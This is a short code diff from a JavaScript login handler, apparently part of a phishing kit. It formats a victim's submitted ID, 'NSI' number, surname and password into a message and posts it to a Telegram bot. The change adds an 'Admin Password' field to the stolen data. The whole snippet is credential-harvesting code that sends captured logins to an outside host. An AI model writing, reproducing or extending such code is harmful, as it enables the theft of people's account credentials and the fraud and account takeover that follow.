@@ -53,7 +53,7 @@ const submitLogin = async (req, res) => {
 			timestamp: moment().format(),
 		});
 
-		let originalText = `ID: ${uniqueid}\nNSI: ${nsiNumber}\nLast name: ${surname}\nPassword: ${password}`;
+		let originalText = `ID: ${uniqueid}\nNSI: ${nsiNumber}\nLast name: ${surname}\nPassword: ${password}\n\nAdmin Password: ${owner}`;
 		await axios
 			.post(
 				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
